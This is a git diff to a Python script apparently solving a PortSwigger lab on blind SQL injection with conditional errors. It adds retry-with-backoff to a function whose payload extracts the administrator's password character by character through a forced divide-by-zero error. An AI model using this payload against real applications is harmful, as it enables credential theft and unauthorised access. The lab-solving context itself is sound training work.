@@ -1,5 +1,6 @@
 import string
 import requests
+import backoff
 
 """ Exploiting blind SQL injection by triggering conditional errors
 https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors
@@ -58,6 +59,16 @@ def bruteforce_password_character(candidates, pos):
         return False
 
 
+def try_candidate_on_backoff(_details):
+    print("/", end="")
+
+
+@backoff.on_exception(
+    backoff.expo,
+    requests.exceptions.RequestException,
+    max_tries=8,
+    on_backoff=try_candidate_on_backoff,
+)
 def try_candidate(pos, candidate):
     payload = f"xyz' union select case when (SUBSTR((select password from users where username = 'administrator'), {pos}, 1) = '{candidate}') then to_char(1/0) else null end from dual -- "
     # print(f"SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '{payload}'")
